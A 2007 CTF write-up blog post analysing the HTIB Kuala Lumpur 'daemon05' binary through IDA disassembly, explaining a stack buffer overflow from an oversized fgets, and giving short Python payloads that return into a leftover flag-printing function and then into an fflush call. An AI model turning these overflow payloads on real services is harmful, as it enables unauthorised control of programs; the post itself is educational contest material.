---
title: Exploiting HTIB 2007 Kuala Lumpur CTF Daemon 05
author: lamer
excerpt: |
  |
    Daemon 05 has a simple buffer overflow error. Exploiting it by returning to a conveniently-left-behind function (an easter egg, I say).
layout: post
tweetcount:
  - 0
tweetbackscheck:
  - 1408359076
shorturls:
  - 'a:4:{s:9:"permalink";s:82:"http://www.vnsecurity.net/2007/09/exploiting-htib-2007-kuala-lumpur-ctf-daemon-05/";s:7:"tinyurl";s:26:"http://tinyurl.com/ydkcuga";s:4:"isgd";s:18:"http://is.gd/aOubC";s:5:"bitly";s:0:"";}'
twittercomments:
  - 'a:0:{}'
category:
  - 'CTF - CLGT Crew'
---
## Identify `main`

Like the previous blog post, let&#8217;s start with the `start` function.

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&lt;b&gt;.text:&lt;/b&gt;080488B0                 public start
&lt;b&gt;.text:&lt;/b&gt;080488B0 start           proc near
&lt;b&gt;.text:&lt;/b&gt;080488B0                 &lt;b&gt;xor&lt;/b&gt;     &lt;b&gt;ebp&lt;/b&gt;, &lt;b&gt;ebp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488B2                 &lt;b&gt;pop&lt;/b&gt;     &lt;b&gt;esi&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488B3                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;ecx&lt;/b&gt;, &lt;b&gt;esp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488B5                 &lt;b&gt;and&lt;/b&gt;     &lt;b&gt;esp&lt;/b&gt;, 0FFFFFFF0h
&lt;b&gt;.text:&lt;/b&gt;080488B8                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488B9                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;esp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488BA                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;edx&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488BB                 &lt;b&gt;push&lt;/b&gt;    offset sub_804C650
&lt;b&gt;.text:&lt;/b&gt;080488C0                 &lt;b&gt;push&lt;/b&gt;    offset sub_804C5F0
&lt;b&gt;.text:&lt;/b&gt;080488C5                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;ecx&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488C6                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;esi&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;080488C7                 &lt;b&gt;push&lt;/b&gt;    offset main
&lt;b&gt;.text:&lt;/b&gt;080488CC                 &lt;b&gt;call&lt;/b&gt;    ___libc_start_main
</pre>

We identify the `main` function as the last argument to `___libc_start_main`. So let&#8217;s get to it.

## Analyze `main`

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&lt;b&gt;.text:&lt;/b&gt;08048ABE main            proc near               ; DATA XREF: start+17&uarr;o
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE var_518         &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;518h
&lt;b&gt;.text:&lt;/b&gt;08048ABE var_514         &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;514h
&lt;b&gt;.text:&lt;/b&gt;08048ABE var_510         &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;510h
&lt;b&gt;.text:&lt;/b&gt;08048ABE var_208         &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;208h
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;ebp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048ABF                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;ebp&lt;/b&gt;, &lt;b&gt;esp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048AC1                 &lt;b&gt;sub&lt;/b&gt;     &lt;b&gt;esp&lt;/b&gt;, 518h       ; char *
&lt;b&gt;.text:&lt;/b&gt;08048AC7                 &lt;b&gt;and&lt;/b&gt;     &lt;b&gt;esp&lt;/b&gt;, 0FFFFFFF0h
&lt;b&gt;.text:&lt;/b&gt;08048ACA                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 0
&lt;b&gt;.text:&lt;/b&gt;08048ACF                 &lt;b&gt;add&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 0Fh
&lt;b&gt;.text:&lt;/b&gt;08048AD2                 &lt;b&gt;add&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 0Fh
&lt;b&gt;.text:&lt;/b&gt;08048AD5                 &lt;b&gt;shr&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 4
&lt;b&gt;.text:&lt;/b&gt;08048AD8                 &lt;b&gt;shl&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 4
&lt;b&gt;.text:&lt;/b&gt;08048ADB                 &lt;b&gt;sub&lt;/b&gt;     &lt;b&gt;esp&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048ADD                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_518&lt;b&gt;]&lt;/b&gt;, offset aCodedByXwings_ ; &quot;Coded By xWinGs. a code just to make yo&quot;...
&lt;b&gt;.text:&lt;/b&gt;08048AE4                 &lt;b&gt;call&lt;/b&gt;    _printf
&lt;b&gt;.text:&lt;/b&gt;08048AE9                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_518&lt;b&gt;]&lt;/b&gt;, offset aSecretCode ; &quot;Secret Code: &quot;
&lt;b&gt;.text:&lt;/b&gt;08048AF0                 &lt;b&gt;call&lt;/b&gt;    _printf
&lt;b&gt;.text:&lt;/b&gt;08048AF5                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;ds&lt;/b&gt;&lt;b&gt;:&lt;/b&gt;stdout
&lt;b&gt;.text:&lt;/b&gt;08048AFA                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_518&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048AFD                 &lt;b&gt;call&lt;/b&gt;    _fflush
&lt;b&gt;.text:&lt;/b&gt;08048B02                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_510&lt;b&gt;]&lt;/b&gt;, 200h
&lt;b&gt;.text:&lt;/b&gt;08048B0A                 &lt;b&gt;lea&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;var_208&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B10                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_514&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B14                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_518&lt;b&gt;]&lt;/b&gt;, 0
&lt;b&gt;.text:&lt;/b&gt;08048B1B                 &lt;b&gt;call&lt;/b&gt;    _read
&lt;b&gt;.text:&lt;/b&gt;08048B20                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;ds&lt;/b&gt;&lt;b&gt;:&lt;/b&gt;dword_80529DC, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B25                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_510&lt;b&gt;]&lt;/b&gt;, offset aEtcFlagsDaemon ; &quot;/etc/flags/daemon05.txt&quot;
&lt;b&gt;.text:&lt;/b&gt;08048B2D                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;ds&lt;/b&gt;&lt;b&gt;:&lt;/b&gt;dword_80529DC
&lt;b&gt;.text:&lt;/b&gt;08048B32                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_514&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B36                 &lt;b&gt;lea&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;var_208&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B3C                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;var_518&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B3F                 &lt;b&gt;call&lt;/b&gt;    sub_80489F4
</pre>

First, a few calls to `printf` to advertise this is from xWinGs. Nothing fancy yet. Then a `read` of 0&#215;200 (1024) bytes to `var_208`. So, let&#8217;s rename `var_208` to `input_buffer`. And also note that `input_buffer` is the first item on the stack. After `input_buffer` there comes the frame pointer and a return address.

With the same reasoning as in the previous post, we also rename `var_518` to `first_arg`, `var_514` to `second_arg`, and `var_510` to `third_arg`.

After the `read` is a check for score server packet. We&#8217;ll skip it. And here comes the juicy part.

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&lt;b&gt;.text:&lt;/b&gt;08048B44                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;ds&lt;/b&gt;&lt;b&gt;:&lt;/b&gt;stdin
&lt;b&gt;.text:&lt;/b&gt;08048B49                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;third_arg&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B4D                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;second_arg&lt;b&gt;]&lt;/b&gt;, 300h
&lt;b&gt;.text:&lt;/b&gt;08048B55                 &lt;b&gt;lea&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;input_buffer&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B5B                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;first_arg&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B5E                 &lt;b&gt;call&lt;/b&gt;    _fgets
&lt;b&gt;.text:&lt;/b&gt;08048B63                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;518h&lt;b&gt;+&lt;/b&gt;first_arg&lt;b&gt;]&lt;/b&gt;, offset aWrongCode_ ; &quot;Wrong Code.n&quot;
&lt;b&gt;.text:&lt;/b&gt;08048B6A                 &lt;b&gt;call&lt;/b&gt;    _printf
&lt;b&gt;.text:&lt;/b&gt;08048B6F                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 0
&lt;b&gt;.text:&lt;/b&gt;08048B74                 &lt;b&gt;leave&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B75                 &lt;b&gt;retn&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048B75 main            endp
</pre>

The next call is to `fgets` to read another, uhm, 0&#215;300 bytes to `input_buffer`. And this is where overflow occurs. Remember that `input_buffer` is only 1024 byte long, and after it is the frame pointer and return address. So by overflowing `input_buffer` we are able to control the return address.

Ok, that&#8217;s all fine, but where do we want `main` to return to? A little digging around reveals this piece of unidentified code.

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&lt;b&gt;.text:&lt;/b&gt;08048A60 locret_8048A60&lt;b&gt;:&lt;/b&gt;                         ; CODE XREF: sub_80489F4+29&uarr;j
&lt;b&gt;.text:&lt;/b&gt;08048A60                 &lt;b&gt;leave&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A61                 &lt;b&gt;retn&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A61 sub_80489F4     endp
&lt;b&gt;.text:&lt;/b&gt;08048A61
&lt;b&gt;.text:&lt;/b&gt;08048A62 ; ---------------------------------------------------------------------------
&lt;b&gt;.text:&lt;/b&gt;08048A62                 &lt;b&gt;push&lt;/b&gt;    &lt;b&gt;ebp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A63                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;ebp&lt;/b&gt;, &lt;b&gt;esp&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A65                 &lt;b&gt;sub&lt;/b&gt;     &lt;b&gt;esp&lt;/b&gt;, 48h
&lt;b&gt;.text:&lt;/b&gt;08048A68                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;4&lt;b&gt;]&lt;/b&gt;, offset aR ; &quot;r&quot;
&lt;b&gt;.text:&lt;/b&gt;08048A70                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;]&lt;/b&gt;, offset aEtcFlagsDaemon ; &quot;/etc/flags/daemon05.txt&quot;
&lt;b&gt;.text:&lt;/b&gt;08048A77                 &lt;b&gt;call&lt;/b&gt;    _fopen
&lt;b&gt;.text:&lt;/b&gt;08048A7C                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;-&lt;/b&gt;0Ch&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A7F                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;-&lt;/b&gt;0Ch&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A82                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;8&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A86                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;4&lt;b&gt;]&lt;/b&gt;, 20h
&lt;b&gt;.text:&lt;/b&gt;08048A8E                 &lt;b&gt;lea&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;-&lt;/b&gt;38h&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A91                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A94                 &lt;b&gt;call&lt;/b&gt;    _fgets
&lt;b&gt;.text:&lt;/b&gt;08048A99                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;-&lt;/b&gt;0Ch&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A9C                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;]&lt;/b&gt;, &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048A9F                 &lt;b&gt;call&lt;/b&gt;    _fclose
&lt;b&gt;.text:&lt;/b&gt;08048AA4                 &lt;b&gt;lea&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, &lt;b&gt;[&lt;/b&gt;&lt;b&gt;ebp&lt;/b&gt;&lt;b&gt;-&lt;/b&gt;38h&lt;b&gt;]&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048AA7                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;+&lt;/b&gt;4&lt;b&gt;]&lt;/b&gt;,;;; &lt;b&gt;eax&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048AAB                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;[&lt;/b&gt;&lt;b&gt;esp&lt;/b&gt;&lt;b&gt;]&lt;/b&gt;, offset &lt;b&gt;aS&lt;/b&gt; ; &quot;n%s&quot;
&lt;b&gt;.text:&lt;/b&gt;08048AB2                 &lt;b&gt;call&lt;/b&gt;    _printf
&lt;b&gt;.text:&lt;/b&gt;08048AB7                 &lt;b&gt;mov&lt;/b&gt;     &lt;b&gt;eax&lt;/b&gt;, 0
&lt;b&gt;.text:&lt;/b&gt;08048ABC                 &lt;b&gt;leave&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048ABD                 &lt;b&gt;retn&lt;/b&gt;
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE ; Attributes: bp-based frame
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE main            proc near               ; DATA XREF: start+17&uarr;o
&lt;b&gt;.text:&lt;/b&gt;08048ABE
&lt;b&gt;.text:&lt;/b&gt;08048ABE first_arg       &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;518h
&lt;b&gt;.text:&lt;/b&gt;08048ABE second_arg      &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;514h
&lt;b&gt;.text:&lt;/b&gt;08048ABE third_arg       &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;510h
&lt;b&gt;.text:&lt;/b&gt;08048ABE input_buffer    &lt;b&gt;=&lt;/b&gt; &lt;b&gt;dword&lt;/b&gt; &lt;b&gt;ptr&lt;/b&gt; &lt;b&gt;-&lt;/b&gt;208h
</pre>

Look at `08048A62`! It&#8217;s a function prologue. And indeed from `08048A62` to `08048ABD` is a proper function! What great is that it opens, reads, and prints the flag out! This is so convenient!

## Exploit it

Now, let&#8217;s gather what we&#8217;ve have. We can control where main returns to, and we know there&#8217;s a function that suits our purpose. Therefore, the challenge is&#8230; none. We just return to this function!

With that tactic, our exploit is as trivial as constructing a buffer containing all `08048A62`. And how hard could it be? Two lines of Python code!

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">import struct
buffer = struct.pack("I", 0x08048A62) * 1000
</pre>

## Remotely exploit it

If you tried out the buffer above, you might find that it didn&#8217;t work remotely. This is because the easter-egg function uses `printf` to print out the flag. It is common knowledge that `printf` buffers its content. If the output stream is connected to a console window, the buffering is line-based, otherwise it is block-based. In our case, the output stream is connected to a socket, so the buffering is block-based. Usually, this block is 8 KBytes. Each call to the easter-egg only prints out about 20 bytes. So, to fill this buffer, we will need at least 409 calls to the easter-egg function, or we need to put in 409 * 4 = 0&#215;664 bytes. However, only 0&#215;300 bytes are read in. So this approach fails.

Another approach is to flush the stream after `printf`. Luckily, this is doable by returning to `08048AF5`. At that address, there is a call to `fflush` on `stdout`. Again, we only use existing code.

In summary, in order to exploit daemon05 remotely, we will have to change our buffer to look like:

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">buffer = struct.pack("I", 0x08048A62) * 300 + "xF5x8Ax04x08" + "x0A"
</pre>

## Observation

Well, what should I say? Thank you, xWinGs, for this twisted fun!